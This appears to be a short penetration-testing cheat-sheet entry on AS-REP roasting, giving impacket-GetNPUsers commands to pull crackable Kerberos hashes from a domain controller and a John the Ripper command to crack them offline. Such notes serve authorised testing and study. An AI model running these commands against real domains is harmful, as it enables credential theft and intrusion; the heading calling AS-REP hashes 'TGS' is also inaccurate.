---
label: AS-Rep Roasting
disabled: true
---

# AS-Rep Roasting

Linux:

> **NOTE**: `users.txt` includes usernames to be checked (one username per line).

```bash
# Enumerate ASReproastable users (without credentials)
impacket-GetNPUsers -usersfile users.txt -dc-ip $ip $domain/

# Enumerate ASReproastable users (with credentials)
impacket-GetNPUsers -usersfile users.txt -dc-ip $ip $domain/$user:$pass
```

## Crack TGS offline

```bash
john --format=krb5asrep --wordlist=$wordlist $asrep_file
```
